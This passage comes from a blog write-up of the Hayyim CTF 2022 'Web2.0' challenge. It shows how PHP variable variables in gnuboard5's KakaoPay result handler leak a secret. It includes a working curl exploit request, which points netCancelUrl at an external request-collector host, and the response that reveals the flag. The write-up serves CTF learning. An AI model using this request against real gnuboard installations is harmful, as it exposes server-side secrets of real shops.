      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>            <span class="k">if</span> <span class="p">(</span><span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="nf">processHTTP</span><span class="p">(</span><span class="nv">$netCancel</span><span class="p">,</span> <span class="nv">$authMap</span><span class="p">))</span> <span class="p">{</span>
                <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">body</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="k">echo</span> <span class="s2">"Http Connect Error</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
                <span class="k">echo</span> <span class="nv">$httpUtil</span><span class="o">-&gt;</span><span class="n">errormsg</span><span class="p">;</span>

                <span class="k">throw</span> <span class="k">new</span> <span class="nc">Exception</span><span class="p">(</span><span class="s2">"Http Connect Error"</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">echo</span> <span class="s2">"## 망취소 API 결과 ##"</span><span class="p">;</span>

            <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"&lt;"</span><span class="p">,</span> <span class="s2">"&amp;lt;"</span><span class="p">,</span> <span class="nv">$$netcancelResultString</span><span class="p">);</span>
            <span class="nv">$netcancelResultString</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"&gt;"</span><span class="p">,</span> <span class="s2">"&amp;gt;"</span><span class="p">,</span> <span class="nv">$$netcancelResultString</span><span class="p">);</span>

            <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span><span class="p">,</span> <span class="nv">$netcancelResultString</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
<span class="c1">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L175L189</span>
</pre></td></tr></tbody></table></code></div></div>
<p>The code above is executed when payment fails. Send a request to $netCancle using the $httpUtil-&gt;processHTTP() function, and store the return value in the $netcancelResultString variable. After that, I could see that variable variables were used twice in total by using the str_replace() function.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre>0. HTTP Request
$netcancelResultString = authToken

1. First str_replace()
$$netcancelResultString := $authToken = flag
$netcancelResultString = flag

2. Second str_replace()
$$netcancelResultString := $flag
$netcancelResultString = hsctf{~~~~}
</pre></td></tr></tbody></table></code></div></div>
<p>If the string called authToken is included in the value of $netcancelResultString after http request as above When the str_replace() function is called for the first time, the string called flag will be saved as the value of the $netcancelResultString variable by variable variables. ($authToken is flag)</p>

<p>The second time the str_replace() function is called, the value of the $$netcancelResultString variable is the same as $flag, so the flag saved in common.php will be saved in the $netcancelResultString variable.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>        <span class="nv">$authUrl</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'authUrl'</span><span class="p">];</span>    <span class="c1">// 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)</span>
        <span class="c1">// https://github.com/gnuboard/gnuboard5/blob/master/shop/kakaopay/pc_pay_result.php#L33</span>
</pre></td></tr></tbody></table></code></div></div>
<p>In order to generate an error, pass an incorrect URL as the value of <code class="language-plaintext highlighter-rouge">authUrl</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre> ⚡ root@pocas  ~  curl http://1.230.253.91:5000/shop/kakaopay/pc_pay_result.php\?authUrl\=http://\&amp;netCancelUrl\=https://6668197e65f7e3f7f5b45ff55a909ddd.m.pipedream.net/\&amp;authToken\=flag\&amp;resultCode\=0000
Http Connect Error
Connection failed (0) Failed to parse address ""Http Connect Error (오류코드:0)## 망취소 API 결과 ##&lt;pre&gt;hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}&lt;/pre&gt;&lt;br&gt;&lt;br&gt;결제 에러가 일어났습니다. 에러 이유는 위와 같습니
다.
</pre></td></tr></tbody></table></code></div></div>
<p>Finally I got the flags by sending a request like above.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG : hsctf{799c12711fd9d697a00ae3e6329a7979cc648d7cdae0fbb3d62f23a1f7c7f544}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<p>Thanks to <a href="http://www.hayyimsecurity.com/">Hayyim Security</a> for making these fun challenges. It’s been a long time since I studied a lot.</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Hayyim%20CTF%202022%20Write%20Up%20-%20Web2.0&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHayyim-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Hayyim%20CTF%202022%20Write%20Up%20-%20Web2.0&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHayyim-CTF%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHayyim-CTF%2F&text=Hayyim%20CTF%202022%20Write%20Up%20-%20Web2.0" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get the last 5 posts from lastmod list. -->















              <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


            </div>

            
              
              




            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->














  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Line-CTF-2022/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1648371653"
  data-df="ll"
  
>
  Mar 27, 2022
</time>

              <h4 class="pt-0 my-2">Line CTF 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  Summary


  Summary
  (Web) gotm
  (Web) online-library


I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf.

So I am very not good. Just get a stress. So...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/SSTF/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1661227253"
  data-df="ll"
  
>
  Aug 23, 2022
</time>

              <h4 class="pt-0 my-2">SSTF 2022 JWT Decoder Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  I participated in the CTF called sstf after 5 months. Today, I wrote that how to solve a JWT Decoder.

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
~/Downloads/prob
❯ tree -I &quot;node_modules&quot;
.
├── D...
                </p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/CCE-2022/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1664078453"
  data-df="ll"
  
>
  Sep 25, 2022
</time>

              <h4 class="pt-0 my-2">CCE 2022 Write Up</h4>
              <div class="text-muted">
                <p>
                  





                  After a long time I did ctf again. Actually, a few days ago, 김지섭님, a member of zer0pt, asked me to do CCE together, but I refused. The reason was because of work.

But I was able to find 5 XSS from...
                </p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/RealWrold-CTF/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Real World CTF 4th Hack into Skynet Write Up</p>
    </a>
  

  
    <a
      href="/posts/RCE-in-NASA/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>NASA, Remote Code Excution (0-Day Exploit)</p>
    </a>
  
</nav>

            
              
              <!--  The comments switcher -->


            

            <!-- The Footer -->

<footer
style="background-color:#030014"
>

</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- JavaScripts -->

    <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js"></script>






<script defer src="/assets/js/dist/post.min.js"></script>






    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  /* Note: dependent library will be loaded in `js-selector.html` */
  SimpleJekyllSearch({
    searchInput: document.getElementById('search-input'),
    resultsContainer: document.getElementById('search-results'),
    json: '/assets/js/data/search.json',
    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
    noResultsText: '<p class="mt-5"></p>',
    templateMiddleware: function(prop, value, template) {
      if (prop === 'categories') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
        }
      }

      if (prop === 'tags') {
        if (value === '') {
          return `${value}`;
        } else {
          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
        }
      }
    }
  });
</script>

  </body>
</html>

